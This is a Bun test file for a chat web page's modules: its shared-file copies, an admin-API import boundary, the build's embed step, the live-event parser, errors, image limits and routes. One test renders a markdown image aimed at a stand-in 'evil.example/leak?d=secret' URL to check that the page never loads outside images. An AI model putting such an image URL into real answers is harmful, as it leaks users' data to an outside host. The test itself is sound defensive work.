/**
 * channel-web's chat page (`registry/components/channel-web/chat/`, features/completed/channel-web.md sections 1
 * and 5): its copies of the dashboard's shared pieces and of channel-web's `api.ts` are the sources,
 * byte for byte; it never reaches the admin client; its build embeds into channel-web's
 * `chat-files.ts` only where channel-web is installed, and refuses a bundle naming the admin API; and
 * its pure modules (the live events' parser, the conversation's source for the shared view, errors,
 * image limits, routes and the links that land on them, the config read when the tab comes back) do
 * what the page needs.
 * Building it needs its npm packages, so it is built by hand (`bun install && bun run build` there);
 * a built `dist/` is checked when there is one.
 */

import { afterAll, describe, expect, test } from "bun:test";
import { appendFileSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { setPasswordLink } from "../registry/components/channel-web/files/src/pikit/channel-web/accounts/links.ts";
import { type ChatFiles, createAssets } from "../registry/components/channel-web/files/src/pikit/channel-web/assets.ts";
import { IMAGE_TYPES, MAX_DURABLE_IMAGE_BYTES, MAX_IMAGE_BYTES, MAX_IMAGES, MAX_TEXT } from "../registry/components/channel-web/chat/src/lib/chat-api.ts";
import { ChatFailure, errorText, failureOf, landingText, normalCode } from "../registry/components/channel-web/chat/src/lib/errors.ts";
import { base64Bytes, imageLimits, messageProblem } from "../registry/components/channel-web/chat/src/lib/images.ts";
import { INITIAL, type LiveState, reduce } from "../registry/components/channel-web/chat/src/lib/transcript.ts";
import { type ChatClient, chatSource, conversationsPath, transcriptPath } from "../registry/components/channel-web/chat/src/lib/source.ts";
import { parseRoute, screenKey, setPasswordOf, settingsSectionOf } from "../registry/components/channel-web/chat/src/lib/routes.ts";
import { readSse, SseParser } from "../registry/components/channel-web/chat/src/lib/sse.ts";
import { onVisibleAgain } from "../registry/components/channel-web/chat/src/lib/visible.ts";
import { CHAT, chatBoundaryViolations, chatCopies, staleCopies } from "./chat-shared.ts";
import { SHARED_UI_FILES } from "./ui-shared.ts";

const REPO = join(import.meta.dir, "..");
const read = (path: string) => readFileSync(join(CHAT, path), "utf8");

const temps: string[] = [];
afterAll(() => temps.forEach((dir) => rmSync(dir, { recursive: true, force: true })));
const temp = (prefix: string) => {
  const dir = mkdtempSync(join(realpathSync(tmpdir()), prefix));
  temps.push(dir);
  return dir;
};

describe("the copies", () => {
  test("every shared piece, the look and channel-web's api.ts are in the chat, byte for byte (`bun scripts/chat-shared.ts generate`)", () => {
    const copies = chatCopies();
    for (const file of SHARED_UI_FILES) expect(copies.has(file)).toBe(true);
    for (const file of ["src/index.css", "public/theme.js", "src/lib/chat-api.ts", "src/components/bui/PromptBar.tsx", "src/components/pikit/message.tsx"]) expect(copies.has(file)).toBe(true);

    expect(staleCopies()).toEqual([]);
  });

  test("the chat's copy of the chat API's types is channel-web's api.ts", () => {
    const original = readFileSync(join(REPO, "registry/components/channel-web/files/src/pikit/channel-web/api.ts"), "utf8");

    expect(read("src/lib/chat-api.ts")).toBe(original);
  });

  test("a copy changed by hand, or missing, is caught", () => {
    const root = temp("pikit-chat-copies-");
    cpSync(join(CHAT, "src"), join(root, "src"), { recursive: true });
    cpSync(join(CHAT, "public"), join(root, "public"), { recursive: true });
    appendFileSync(join(root, "src/components/bui/Button.tsx"), "\n// mine\n");
    rmSync(join(root, "src/lib/chat-api.ts"));

    expect(staleCopies(root)).toEqual(["src/components/bui/Button.tsx", "src/lib/chat-api.ts"]);
  });

  test("its npm packages are the dashboard's, at the dashboard's exact versions, with a lockfile and a build that embeds", () => {
    const own = JSON.parse(read("package.json")) as Record<string, Record<string, string>>;
    const dashboard = JSON.parse(readFileSync(join(REPO, "registry/dashboard/files/package.json"), "utf8")) as Record<string, Record<string, string>>;
    const pinned = { ...dashboard.dependencies, ...dashboard.devDependencies };

    for (const [name, version] of Object.entries({ ...own.dependencies, ...own.devDependencies })) expect([name, version]).toEqual([name, pinned[name] ?? "not the dashboard's"]);
    expect(own.scripts?.build).toBe("tsc -b && vite build && bun scripts/embed.ts");
    expect(existsSync(join(CHAT, "bun.lock"))).toBe(true);
  });
});

describe("no admin client", () => {
  test("no file of the chat reaches the admin client or the dashboard's views", () => {
    expect(chatBoundaryViolations()).toEqual([]);
  });

  test("one that does is caught, by @/ or by a relative path, and so is an admin-client file in its src/lib/", () => {
    const root = temp("pikit-chat-boundary-");
    cpSync(join(CHAT, "src"), join(root, "src"), { recursive: true });
    // Re-exports: the same import edges, without the phrase the boundary scanner reads as an import.
    appendFileSync(join(root, "src/app.tsx"), '\nexport { ApiFailure } from "@/lib/api";\n');
    appendFileSync(join(root, "src/screens/layout.tsx"), '\nexport { useChats } from "../lib/chats.tsx";\n');
    appendFileSync(join(root, "src/lib/client.ts"), '\nexport type { ApiApp } from "./admin-api.ts";\n');
    appendFileSync(join(root, "src/screens/chats.tsx"), '\nexport { HomePage } from "@/views/home";\n');
    writeFileSync(join(root, "src/lib/shell.tsx"), "export const x = 1;\n");

    expect(chatBoundaryViolations(root)).toEqual([
      { file: "src/app.tsx", specifier: "@/lib/api" },
      { file: "src/lib/client.ts", specifier: "./admin-api.ts" },
      { file: "src/lib/shell.tsx", specifier: "(the file itself)" },
      { file: "src/screens/chats.tsx", specifier: "@/views/home" },
      { file: "src/screens/layout.tsx", specifier: "../lib/chats.tsx" },
    ]);
  });

  test.skipIf(!existsSync(join(CHAT, "dist")))("the built bundle names no admin API", () => {
    const files = (dir: string): string[] => readdirSync(dir, { withFileTypes: true }).flatMap((entry) => (entry.isDirectory() ? files(join(dir, entry.name)) : [join(dir, entry.name)]));
    const named = files(join(CHAT, "dist")).filter((file) => readFileSync(file, "latin1").includes("/admin/"));

    expect(named).toEqual([]);
  });
});

describe("the build", () => {
  /** A project's src/ with the chat's embed step and a built dist/, and channel-web's folder when `withChannel`. */
  function builtProject(withChannel: boolean, script = "console.log('é')"): string {
    const src = temp("pikit-chat-embed-");
    cpSync(join(CHAT, "scripts"), join(src, "chat", "scripts"), { recursive: true });
    mkdirSync(join(src, "chat", "dist", "assets"), { recursive: true });
    writeFileSync(join(src, "chat", "dist", "index.html"), "<!doctype html><div id=root></div>");
    writeFileSync(join(src, "chat", "dist", "assets", "index-abc.js"), script);
    writeFileSync(join(src, "chat", "dist", "mark.svg"), "<svg/>");
    if (withChannel) {
      mkdirSync(join(src, "pikit", "channel-web"), { recursive: true });
      cpSync(join(REPO, "registry/components/channel-web/files/src/pikit/channel-web/assets.ts"), join(src, "pikit", "channel-web", "assets.ts"));
    }
    return src;
  }

  async function embed(src: string): Promise<{ code: number; out: string }> {
    const child = Bun.spawn([process.execPath, join(src, "chat", "scripts", "embed.ts")], { stdout: "pipe", stderr: "pipe" });
    const [out, err, code] = await Promise.all([new Response(child.stdout).text(), new Response(child.stderr).text(), child.exited]);
    return { code, out: out + err };
  }

  test("its last step writes dist/ into channel-web's chat-files.ts, which channel-web serves under /chat/ byte for byte", async () => {
    const src = builtProject(true);

    const first = await embed(src);
    expect(first).toMatchObject({ code: 0 });
    expect(first.out).toContain("embed: 3 files into");
    const { CHAT_FILES } = (await import(join(src, "pikit", "channel-web", "chat-files.ts"))) as { CHAT_FILES: ChatFiles };
    expect(Object.keys(CHAT_FILES)).toEqual(["assets/index-abc.js", "index.html", "mark.svg"]);
    const assets = createAssets(CHAT_FILES);
    expect(await assets.serve("/chat/").text()).toContain("id=root");
    expect(await assets.serve("/chat/assets/index-abc.js").text()).toBe("console.log('é')");

    expect((await embed(src)).out).toContain("is up to date (3 files)");
  });

  test("without channel-web next to it (the kit's registry), the build makes dist/ only and writes nothing beside it", async () => {
    const src = builtProject(false);

    expect(await embed(src)).toMatchObject({ code: 0, out: expect.stringContaining("channel-web is not installed") });
    expect(existsSync(join(src, "pikit"))).toBe(false);
  });

  test("a bundle naming the admin API is refused and embedded nowhere", async () => {
    const src = builtProject(true, 'fetch("/admin/api/app")');

    expect(await embed(src)).toMatchObject({ code: 1, out: expect.stringContaining("assets/index-abc.js name the admin API") });
    expect(existsSync(join(src, "pikit", "channel-web", "chat-files.ts"))).toBe(false);
  });

  test("it is served under /chat/, with every asset a file and no inline script (the Content-Security-Policy)", () => {
    const html = read("index.html");
    const scripts = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/g)];

    expect(read("vite.config.ts")).toContain('base: "/chat/"');
    expect(read("vite.config.ts")).toContain("assetsInlineLimit: 0");
    expect(scripts.length).toBeGreaterThan(0);
    for (const [, attributes = "", body = ""] of scripts) {
      expect(attributes).toContain("src=");
      expect(body.trim()).toBe("");
    }
    expect(html).toContain('<script src="/chat/theme.js"></script>');
    expect(read("package.json")).not.toContain("@central-icons-react");
    expect(read("package.json")).not.toContain("better-auth");
  });
});

describe("live events", () => {
  test("the parser gives each event at its blank line, whatever the chunks, and skips heartbeats", () => {
    const parser = new SseParser();
    const text = 'data: {"type":"state","busy":true}\n\n: heartbeat\n\ndata: {"type":"partial",\r\ndata: "text":"Hi"}\r\n\r\nevent: error\ndata: {"error":"watch_failed"}\n\ndata:no-space\n\nevent: empty\n\n';
    const all = [...text].flatMap((char) => parser.push(char));

    expect(all).toEqual([
      { event: "message", data: '{"type":"state","busy":true}' },
      { event: "message", data: '{"type":"partial",\n"text":"Hi"}' },
      { event: "error", data: '{"error":"watch_failed"}' },
      { event: "message", data: "no-space" },
    ]);
    expect(new SseParser().push(text)).toEqual(all);
    // A `\r` at a chunk's end waits for its `\n`.
    const split = new SseParser();
    expect(split.push("data: a\r")).toEqual([]);
    expect(split.push("\n\r\n")).toEqual([{ event: "message", data: "a" }]);
  });

  /** A body that gives `chunks` one by one, as a `fetch` response's. */
  const body = (chunks: string[]) =>
    new ReadableStream<Uint8Array<ArrayBuffer>>({
      start(controller) {
        for (const chunk of chunks) controller.enqueue(new TextEncoder().encode(chunk) as Uint8Array<ArrayBuffer>);
        controller.close();
      },
    });
  const fold = (events: unknown[], from: LiveState = INITIAL): LiveState => events.reduce<LiveState>((state, event) => reduce(state, { type: "event", event: event as { type: string } }), from);

  test("a stream's events, read with fetch and folded by the shared live state: the answer as written, then its entry by the transcript's id; an error event ends it", async () => {
    const answer = { role: "assistant", content: [{ type: "text", text: "Hello" }], timestamp: 2 };
    const text = [
      `data: ${JSON.stringify({ type: "snapshot", run: {}, tools: [] })}\n\n`,
      ": heartbeat\n\n",
      `data: ${JSON.stringify({ type: "message_start", message: { ...answer, content: [{ type: "text", text: "" }] } })}\n\n`,
      `data: ${JSON.stringify({ type: "message_update", changes: [{ type: "text_delta", contentIndex: 0, delta: "Hel" }] })}\n\n`,
      `data: ${JSON.stringify({ type: "message_update", changes: [{ type: "text_delta", contentIndex: 0, delta: "lo" }] })}\n\n`,
      `data: ${JSON.stringify({ type: "message_end", entry: { id: "web:r1#ab12", kind: "message", model: [answer] } })}\n\n`,
      `data: ${JSON.stringify({ type: "run_end" })}\n\n`,
      'event: error\ndata: {"error":"watch_failed"}\n\n',
      `data: ${JSON.stringify({ type: "run_start" })}\n\n`,
    ].join("");
    // Cut anywhere: the parser waits for each event's blank line.
    const chunks = text.match(/[\s\S]{1,7}/g) ?? [];
    const events: unknown[] = [];
    await readSse(body(chunks), (event) => events.push(event));

    expect(events.map((event) => (event as { type: string }).type)).toEqual(["snapshot", "message_start", "message_update", "message_update", "message_end", "run_end"]);
    const writing = fold(events.slice(0, 4));
    expect(writing).toMatchObject({ busy: true, partial: { content: [{ type: "text", text: "Hello" }] } });
    // The ended answer is the transcript's entry, by its id: the view merges it with the transcript, nothing swapped.
    const ended = fold(events);
    expect(ended).toMatchObject({ busy: false, partial: undefined, entries: [{ id: "web:r1#ab12", kind: "message", messages: [answer] }] });
    expect(ended.changes).toBeGreaterThan(0);
  });

  test("the chat's source reads the chat API's transcript, events, messages and abort, and checks a message before it goes", async () => {
    const calls: { method: string; path: string; body?: unknown }[] = [];
    const client: ChatClient = {
      get: async <T>(path: string) => (calls.push({ method: "GET", path }), { items: [], next: "c2" } as T),
      post: async <T>(path: string, body?: unknown) => (calls.push({ method: "POST", path, body }), { requestId: "web:x", admission: "queued" } as T),
      follow: async (path) => void calls.push({ method: "FOLLOW", path }),
    };
    const source = chatSource("a b/c", client, "durable");
    /** What the composer sends (`ComposerMessage`): with the image's file name, and whether to search the web. */
    const composed = (message: { text: string; images: { name: string; mimeType: string; data: string }[]; webSearch: boolean }) => message;

    expect(source.id).toBe("a b/c");
    expect(await source.transcript({ limit: 50 })).toEqual({ items: [], next: "c2" });
    await source.transcript({ limit: 50, cursor: "x&y=1" });
    await source.follow(() => {}, new AbortController().signal);
    expect(await source.send(composed({ text: "hi", images: [{ name: "a.png", mimeType: "image/png", data: "iVBORw0KGgo=" }], webSearch: true }))).toEqual({ requestId: "web:x", admission: "queued" });
    await source.send(composed({ text: "only text", images: [], webSearch: false }));
    await source.abort();
    expect(calls).toEqual([
      { method: "GET", path: "/conversations/a%20b%2Fc/transcript?limit=50" },
      { method: "GET", path: "/conversations/a%20b%2Fc/transcript?limit=50&cursor=x%26y%3D1" },
      { method: "FOLLOW", path: "/conversations/a%20b%2Fc/events" },
      // Never a web search: the chat has none.
      { method: "POST", path: "/conversations/a%20b%2Fc/messages", body: { text: "hi", images: [{ mimeType: "image/png", data: "iVBORw0KGgo=" }] } },
      { method: "POST", path: "/conversations/a%20b%2Fc/messages", body: { text: "only text" } },
      { method: "POST", path: "/conversations/a%20b%2Fc/abort", body: undefined },
    ]);

    // Refused before it goes: nothing sent.
    const before = calls.length;
    await expect(source.send(composed({ text: "  ", images: [], webSearch: false }))).rejects.toThrow("Write something");
    const two = [0, 1].map((i) => ({ name: `${i}.png`, mimeType: "image/png", data: Buffer.alloc(600 * 1024).toString("base64") }));
    await expect(source.send(composed({ text: "", images: two, webSearch: false }))).rejects.toThrow("1 MB in all");
    expect(calls.length).toBe(before);
  });

  test("the paths: a transcript's page, and the conversations by page, archived or searched", () => {
    expect(transcriptPath("c1", { limit: 20 })).toBe("/conversations/c1/transcript?limit=20");
    expect(conversationsPath({ limit: 30 })).toBe("/conversations?limit=30");
    expect(conversationsPath({ limit: 30, cursor: "n/1", archived: true, q: "  trip to Rome " })).toBe("/conversations?limit=30&cursor=n%2F1&archived=1&q=trip+to+Rome");
    expect(conversationsPath({ limit: 30, q: "   " })).toBe("/conversations?limit=30");
  });

  test("the old conversation code is gone: the page renders the shared view, never its own", () => {
    for (const file of ["src/lib/live.ts", "src/lib/live-state.ts", "src/lib/outbox.ts"]) expect(existsSync(join(CHAT, file))).toBe(false);
    expect(read("src/screens/conversation.tsx")).toContain("<ConversationView");
    expect(read("src/screens/conversation.tsx")).not.toContain("<Reply");
  });
});

describe("errors", () => {
  test("a chat API error, a better-auth error, a rate limit and a bare status each become a ChatFailure said humanly", () => {
    const denied = failureOf(403, { error: "denied", message: "Only some users may ask this." });
    expect(denied).toBeInstanceOf(ChatFailure);
    expect({ status: denied.status, code: denied.code, message: denied.message }).toEqual({ status: 403, code: "denied", message: "Only some users may ask this." });
    expect(failureOf(404, { error: "not_found" }).message).toContain("not here");
    expect(failureOf(401, { code: "INVALID_EMAIL_OR_PASSWORD", message: "Invalid email or password" })).toMatchObject({ status: 401, code: "INVALID_EMAIL_OR_PASSWORD", message: "That email and password do not match an account." });
    expect(failureOf(403, { code: "SIGN_UP_NOT_ALLOWED", message: "x" }).message).toContain("by invitation");
    expect(failureOf(429, { message: "Too many requests." }).message).toContain("Too many tries");
    expect(failureOf(502, undefined)).toMatchObject({ code: "http_502", message: expect.stringContaining("not answering") });
    expect(failureOf(418, "teapot")).toMatchObject({ code: "http_418", message: "That did not work (HTTP 418)." });
    // An unknown code keeps the server's words, else names itself.
    expect(failureOf(400, { code: "SOMETHING_NEW", message: "Something new happened" }).message).toBe("Something new happened");
    expect(errorText("weird_code")).toBe("That did not work (weird_code).");
  });

  test("codes a provider's or a link's redirect leaves in the address read alike in any spelling", () => {
    expect(normalCode("account not linked")).toBe("ACCOUNT_NOT_LINKED");
    expect(errorText("account_not_linked")).toBe(errorText("ACCOUNT_NOT_LINKED"));
    expect(errorText("unable to link account")).toContain("could not be linked");
    expect(errorText("BANNED")).toBe("This account is suspended.");
    expect(errorText("new_user_signup_disabled")).toContain("by invitation");
    expect(errorText("INVALID_TOKEN")).toContain("not valid");
  });

  test("a code in the address is said by its known text, else a generic one: never words the address carries", () => {
    expect(landingText("account not linked")).toBe(errorText("ACCOUNT_NOT_LINKED"));
    expect(landingText("BANNED")).toBe("This account is suspended.");
    const unknown = landingText("Your account is locked, call +1 555 0100 to unlock it");
    expect(unknown).toBe("That sign-in did not work. Try again, or sign in another way.");
    expect(read("src/lib/location.ts")).not.toContain("error_description\") ??");
    expect(read("src/app.tsx")).toContain("landingText(found.code)");
  });
});

describe("an answer's images", () => {
  // Rendered with the chat's own packages: checked when they are installed (`bun install` there).
  const installed = existsSync(join(CHAT, "node_modules/@comark/react")) && existsSync(join(CHAT, "node_modules/react-dom"));
  test.skipIf(!installed)("on the chat page an image of another site is a link, never loaded; one of its own shows; the dashboard's shows any", async () => {
    const at = globalThis as { window?: unknown };
    const before = at.window;
    at.window = { location: { href: "https://chat.example.com/chat/", origin: "https://chat.example.com" } };
    try {
      const { parse, Render } = await import(join(CHAT, "src/components/pikit/markdown-engine.tsx"));
      const { createElement } = await import(join(CHAT, "node_modules/react/index.js"));
      const { renderToStaticMarkup } = await import(join(CHAT, "node_modules/react-dom/server.js"));
      const document = await parse("![the data](https://evil.example/leak?d=secret) ![own](/chat/mark.svg) ![a pixel](data:image/png;base64,iVBORw0KGgo=)");
      const chat = renderToStaticMarkup(createElement(Render, { document, images: "same-origin" })) as string;
      expect(chat).not.toContain('src="https://evil.example');
      expect(chat).toContain('href="https://evil.example/leak?d=secret"');
      expect(chat).toContain('src="/chat/mark.svg"');
      // Neither loaded nor a link: its alt text.
      expect(chat).not.toContain("data:image");
      expect(chat).toContain("a pixel");
      const dashboard = renderToStaticMarkup(createElement(Render, { document })) as string;
      expect(dashboard).toContain('src="https://evil.example/leak?d=secret"');
    } finally {
      at.window = before;
    }
  });
});

describe("the composer", () => {
  const installed = existsSync(join(CHAT, "node_modules/react-dom"));
  // The "+" button was named "Add images or web search" on the chat page, whose menu has images only.
  test.skipIf(!installed)('its "+" button is named by what its menu offers: the chat page\'s "Add images"', async () => {
    const { default: PromptBar } = await import(join(CHAT, "src/components/bui/PromptBar.tsx"));
    const { createElement } = await import(join(CHAT, "node_modules/react/index.js"));
    const { renderToStaticMarkup } = await import(join(CHAT, "node_modules/react-dom/server.js"));
    const render = (props: Record<string, unknown>) => renderToStaticMarkup(createElement(PromptBar, { onSend: () => {}, ...props })) as string;
    const images = imageLimits("server");
    expect(render({ images })).toContain('aria-label="Add images"');
    expect(render({ images })).not.toContain("web search");
    expect(render({ images, webSearch: { available: true } })).toContain('aria-label="Add images or web search"');
    expect(render({ webSearch: { available: true } })).toContain('aria-label="Web search"');
    expect(render({})).not.toContain("aria-expanded");
  });

  // With the default policy (tools: "names") a call's result is withheld: it opened to "(no output)".
  test.skipIf(!installed)("a tool call opens to its result only where results are shown: the chat with tools withheld shows the name alone", async () => {
    const { default: ToolChips } = await import(join(CHAT, "src/components/bui/ToolChips.tsx"));
    const { createElement } = await import(join(CHAT, "node_modules/react/index.js"));
    const { renderToStaticMarkup } = await import(join(CHAT, "node_modules/react-dom/server.js"));
    const steps = [{ id: "c1", icon: "tool", label: "fetch", mono: true, status: "done" }];
    const render = (props: Record<string, unknown>) => renderToStaticMarkup(createElement(ToolChips, { steps, ...props })) as string;
    expect(render({})).toContain("aria-expanded");
    expect(render({})).toContain("(no output)");
    const withheld = render({ details: false });
    expect(withheld).toContain("fetch");
    expect(withheld).not.toContain("aria-expanded");
    expect(withheld).not.toContain("(no output)");
  });
});

describe("images", () => {
  const image = (bytes: number, mimeType = "image/png") => ({ mimeType, data: Buffer.alloc(bytes).toString("base64") });

  test("the composer's limits are the API's, with the smaller total on Cloudflare", () => {
    expect(imageLimits("server")).toEqual({ types: IMAGE_TYPES, count: MAX_IMAGES, bytes: MAX_IMAGE_BYTES });
    expect(imageLimits("durable")).toEqual({ types: IMAGE_TYPES, count: MAX_IMAGES, bytes: MAX_IMAGE_BYTES, totalBytes: MAX_DURABLE_IMAGE_BYTES });
    for (const bytes of [0, 1, 2, 3, 4, 1000, 1001]) expect(base64Bytes(Buffer.alloc(bytes).toString("base64"))).toBe(bytes);
  });

  test("a message is refused before it is sent when it is empty, too long, or its images break a limit", () => {
    expect(messageProblem("hi", [], "server")).toBeUndefined();
    expect(messageProblem("", [image(10)], "server")).toBeUndefined();
    expect(messageProblem("  ", [], "server")).toContain("Write something");
    expect(messageProblem("x".repeat(MAX_TEXT + 1), [], "server")).toContain("at most");
    expect(messageProblem("", Array.from({ length: MAX_IMAGES + 1 }, () => image(10)), "server")).toContain(`At most ${MAX_IMAGES}`);
    expect(messageProblem("", [image(10, "image/svg+xml")], "server")).toContain("not a PNG");
    expect(messageProblem("", [image(MAX_IMAGE_BYTES + 1)], "server")).toContain("larger than 5 MB");
    const two = [image(600 * 1024), image(600 * 1024)];
    expect(messageProblem("", two, "server")).toBeUndefined();
    expect(messageProblem("", two, "durable")).toContain("1 MB in all");
  });
});

describe("routes", () => {
  test("a signed-out screen is keyed by its route: another route (or query) starts it anew, the same one keeps it", () => {
    const home = parseRoute("#/");
    expect(home.path).toBe("/");
    expect(screenKey(parseRoute(""))).toBe(screenKey(home));
    // "Check your email" shown at #/ is gone at #/sign-in, both the sign-in screen.
    expect(screenKey(parseRoute("#/sign-in"))).not.toBe(screenKey(home));
    expect(screenKey(parseRoute("#/forgot?email=a%40b.c"))).not.toBe(screenKey(parseRoute("#/forgot")));
    expect(screenKey(parseRoute("#/sign-in"))).toBe(screenKey(parseRoute("/sign-in")));
    expect(read("src/app.tsx")).toContain("key={key}");
  });

  test("#/settings[/<section>] opens Settings at a section (profile alone); no other route does; the provider's link comes back to its connected accounts", () => {
    expect(settingsSectionOf("/settings")).toBe("profile");
    expect(settingsSectionOf("/settings/")).toBe("profile");
    expect(settingsSectionOf("/settings/sessions")).toBe("sessions");
    for (const path of ["/", "/account", "/settings-x", "/settings/a/b", "/c/settings"]) expect({ path, section: settingsSectionOf(path) }).toEqual({ path, section: undefined });
    const back = parseRoute(new URL("http://localhost/chat/#/settings/accounts").hash);
    expect(settingsSectionOf(back.path)).toBe("accounts");
    expect(read("src/lib/auth.ts")).toContain('"/chat/#/settings/accounts"');
  });

  test("a link that sets a password, as channel-web makes it, lands with its token, its kind and the account's email", () => {
    const landing = (link: string) => setPasswordOf(parseRoute(new URL(link).hash).query);
    expect(landing(setPasswordLink("https://bot.example.com", "tok-1_x", "invite", "ana+chat@example.com"))).toEqual({ token: "tok-1_x", kind: "invite", email: "ana+chat@example.com" });
    expect(landing(setPasswordLink("https://bot.example.com/", "tok", "welcome", "bo@example.com"))).toEqual({ token: "tok", kind: "welcome", email: "bo@example.com" });
    expect(landing(setPasswordLink("http://localhost:3000", "tok", "reset", "cy@example.com"))).toEqual({ token: "tok", kind: "reset", email: "cy@example.com" });
    // A link without the email (or an empty one) asks it; without a token it is not complete.
    expect(setPasswordOf(new URLSearchParams("token=t&email=%20"))).toEqual({ token: "t", kind: "reset" });
    expect(setPasswordOf(new URLSearchParams("invite=1")).token).toBeNull();
  });
});

describe("the config, read again", () => {
  type Visibility = "visible" | "hidden";
  /** A document whose visibility the test sets. */
  const page = (state: Visibility) => {
    const listeners = new Set<() => void>();
    const doc = {
      visibilityState: state,
      addEventListener: (_type: string, listener: () => void) => listeners.add(listener),
      removeEventListener: (_type: string, listener: () => void) => listeners.delete(listener),
    };
    const set = (next: Visibility) => {
      doc.visibilityState = next;
      for (const listener of listeners) listener();
    };
    return { doc, set, listeners };
  };

  test("each time the tab comes back, never at once, nor for a change that keeps it visible; stopped, never again", () => {
    const { doc, set, listeners } = page("visible");
    let reads = 0;
    const stop = onVisibleAgain(doc, () => reads++);
    expect(reads).toBe(0);
    set("visible");
    expect(reads).toBe(0);
    set("hidden");
    set("visible");
    expect(reads).toBe(1);
    set("hidden");
    set("hidden");
    set("visible");
    set("visible");
    expect(reads).toBe(2);
    stop();
    expect(listeners.size).toBe(0);
    set("hidden");
    set("visible");
    expect(reads).toBe(2);
  });

  test("a page opened hidden reads it when first shown; the app does so only while signed out", () => {
    const { doc, set } = page("hidden");
    let reads = 0;
    onVisibleAgain(doc, () => reads++);
    set("visible");
    expect(reads).toBe(1);
    expect(read("src/app.tsx")).toMatch(/if \(!signedOut\) return;\s+return onVisibleAgain\(document/);
  });
});
